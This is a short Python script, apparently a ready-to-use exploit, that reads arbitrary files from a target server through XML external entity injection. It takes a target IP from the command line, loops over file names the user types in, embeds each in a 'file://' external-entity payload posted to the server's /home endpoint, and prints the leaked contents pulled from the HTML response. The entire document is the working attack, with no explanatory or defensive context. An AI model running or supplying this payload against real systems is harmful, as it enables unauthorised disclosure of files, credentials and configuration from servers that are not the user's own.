import requests
import re
import sys

class bcolors:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    ENDC = '\033[0m'

sess = requests.session()
IPAddress = sys.argv[1] 
while True:    
    filename = input(bcolors.OKBLUE + "Enter the name file you want to view > " ) + bcolors.ENDC
    payload = """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file://"""
    payload += filename
    payload += """ '>]><root>&test;</root>"""
    url = "http://" + IPAddress + "/home"
    postdata = {
        "xxe" : payload
    }
    output = sess.post(url, data=postdata).text

    begin = output.find("</main>")
    end = output.find("<center>")
    out = output[begin :end]
    file = re.sub("</main>", "", out).strip()
    print (bcolors.OKGREEN + file + bcolors.ENDC) 
